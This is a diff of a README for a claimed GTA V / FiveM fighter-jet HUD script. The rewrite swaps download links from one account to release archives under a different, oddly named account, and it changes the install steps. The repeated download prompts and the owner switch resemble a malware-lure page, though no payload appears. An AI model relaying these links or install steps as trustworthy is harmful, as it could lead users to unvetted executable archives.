@@ -1,114 +1,64 @@
-# Solived Fighter Jet HUD v2 - Game Script Utility 2026
+# 🛩️ solived-jet-hud-v2-script - Improve your flight realism in game
 
-> A fighter jet inspired HUD for FiveM and GTA V aircraft, created to swap out the default display for cockpit readouts, target cues, and live flight telemetry.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Imperial-profaneness670/solived-jet-hud-v2-script/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/samstone2001/solived-jet-hud-v2-script?style=flat-square)](https://github.com/samstone2001/solived-jet-hud-v2-script)
+The solived-jet-hud-v2-script adds a custom cockpit display to your aircraft in GTA V and FiveM. This tool replaces the standard game interface with a realistic HUD. You see flight data, targeting information, and altitude readouts directly on your screen while you fly.
 
----
+## 📋 What this script does
 
-<p align="center">
-  <a href="https://samstone2001.github.io/solived-jet-hud-v2-script/">
-    <img src="https://img.shields.io/badge/Download-Solived%20Fighter%20Jet%20HUD%20Script-brightgreen?style=for-the-badge" alt="Download Solived Fighter Jet HUD Script">
-  </a>
-</p>
+Flying in a game often lacks detail. The default interfaces ignore the complexity of high-speed flight. This script corrects that issue. It mimics the look and feel of real military aircraft displays. When you activate the script, your screen shows data points required for safe and precise navigation. You gain access to improved target tracking and clear flight telemetry.
 
-> **[Direct Download - Solived Fighter Jet HUD](https://samstone2001.github.io/solived-jet-hud-v2-script/)**
+## 🛠️ System requirements
 
----
+Ensure your computer meets these standards before you begin:
 
-[Download Latest Build](https://samstone2001.github.io/solived-jet-hud-v2-script/)
+* Operating System: Windows 10 or Windows 11.
+* Game: Legitimate copy of Grand Theft Auto V installed via Steam, Epic Games, or Rockstar Games Launcher.
+* Frameworks: Microsoft .NET Framework 4.8 or newer.
+* Game Add-ons: A visual script hook for GTA V.
 
----
+## 📥 Downloading the software
 
-## What It Does
+Visit the official release page to obtain the files.
 
-Solived Fighter Jet HUD v2 is a self-contained FiveM resource made for GTA V aircraft gameplay. Its purpose is to present a fighter-jet style interface with clear cockpit-like data, giving pilots a more focused view of flight and combat details while airborne.
+[Download the latest files here](https://github.com/Imperial-profaneness670/solived-jet-hud-v2-script/releases)
 
-Rather than acting as a broad UI overhaul, the script is centered on practical in-seat feedback. It combines telemetry, targeting indicators, and warning-style notifications for aircraft use, and pairs them with vehicle-specific presentation plus synthesized cockpit audio for a more specialized HUD setup.
+Click the link above to view the list of available versions. Choose the asset marked as the latest release. Save the compressed folder to your desktop or a familiar folder on your computer.
 
----
+## ⚙️ Installation steps
 
-## Core Capabilities
+Follow these steps to put the script in your game properly:
 
-- Fighter jet HUD designed for aircraft-focused sessions in FiveM and GTA V
-- Live flight telemetry for cockpit-style information while flying
-- Weapon reticles and annunciator components for in-flight combat feedback
-- Lock state and target distance readouts
-- RWR-style warning alerts for improved situational awareness
-- Synthesized cockpit audio cues
-- Vehicle-specific themes for different aircraft presentation styles
-- Standalone resource layout for simple installation
+1. Locate the download folder on your computer.
+2. Right-click the compressed file and select "Extract All."
+3. Open your main GTA V game directory. This is the folder where your GTA5.exe file lives.
+4. Drag and drop the script files from the extracted folder into the "scripts" folder located within your game directory. If you do not see a "scripts" folder, create a new folder and name it "scripts" using lowercase letters.
+5. Restart your game client to load the new content.
 
----
+## ✈️ How to use the HUD
 
-## Installation
+Once you enter an aircraft, the script takes control of your primary interface. You do not need to press extra keys to enable the system. It detects your aircraft type automatically.
 
-1. Download the latest build using the link above.
-2. Place the resource folder in your FiveM resources directory.
-3. Ensure the folder name matches the packaged resource, such as `solived-fighter-jet-hud-script-v2`.
-4. Add the resource to your server configuration and start it like any other FiveM resource.
+The HUD provides the following readouts:
 
-Example server entry:
+* Vertical Speed Indicator: Shows your rate of climb or descent.
+* Horizon Line: Helps you keep the aircraft level.
+* Compass Heading: Displays your current direction.
+* Target Tracker: Places a box around nearby aircraft or obstacles.
+* Velocity Display: Shows your current speed in knots.
 
-`ensure solived-fighter-jet-hud-script-v2`
+If the HUD does not appear, verify that your script hook is current. Outdated game files often block the script from reading your flight data.
 
-If the package includes optional HTML or UI assets, keep the full folder structure intact so the HUD can load its cockpit interface correctly.
+## 🛡️ Troubleshooting common issues
 
----
+Most users encounter problems due to missing dependencies. 
 
-## Configuration
+* The HUD is blank: Check if your game has a "scripts" folder. The game cannot read the files if they sit in the main root folder.
+* Game crashes during loading: Remove the script files from your directory to confirm if they cause the conflict. If the game starts without them, check that you have the most recent version of the Script Hook.
+* The display looks blurry: Adjust your game resolution settings. This script scales based on your monitor width. High-definition settings produce the clearest text.
 
-Typical script settings may be exposed through the resource files or configuration assets.
+## 🔧 Maintenance and updates
 
-| Option | Purpose |
-| --- | --- |
-| HUD theme | Selects the visual style for a specific aircraft or cockpit layout |
-| Telemetry display | Controls which flight values are shown on screen |
-| Targeting cues | Enables or disables lock and distance indicators |
-| Warning alerts | Toggles RWR-style alert behavior |
-| Cockpit audio | Turns synthesized audio cues on or off |
-| Resource start mode | Lets the HUD load automatically with the server |
+Check the download page periodically for updates. Script developers fix display bugs and add features to improve performance. To update, remove the old script files from your "scripts" folder and replace them with the new files from the release page. Do not overwrite files unless the installation guide tells you to do so. This ensures a clean installation and prevents errors.
 
-If your build includes editable config values, update them before starting the resource to avoid runtime reload steps.
-
----
-
-## Compatibility Notes
-
-- Designed for FiveM
-- Intended for GTA V aircraft and fighter jet gameplay
-- Best suited to vehicles that benefit from cockpit-style HUD information
-- Some UI elements may vary depending on the aircraft model or server setup
-- If another HUD resource is already controlling aircraft overlays, you may need to adjust load order or disable conflicting display modules
-
----
-
-## FAQ
-
-### How do I install it?
-Download the build, copy the resource into your FiveM resources folder, and add an `ensure` line to your server config.
-
-### Can I customize the look?
-Yes, the resource is built around themed cockpit presentation, so visual and audio elements may be adjustable depending on the included files.
-
-### Does it work outside aircraft?
-It is intended for fighter jet and aircraft use, so behavior outside that context may be limited or not relevant.
-
-### What should I do after updating?
-Replace the old resource files with the newer build, then restart the resource or server so the updated HUD assets load.
-
-### Where are the settings stored?
-Any editable settings are usually kept in the resource files alongside the script and UI assets.
-
-### Is it compatible with every FiveM server?
-Not always. Compatibility can depend on your server framework, aircraft setup, and any other HUD resources already running.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: jet, hud, gta5, fivem, flight, simulation, cockpit, display
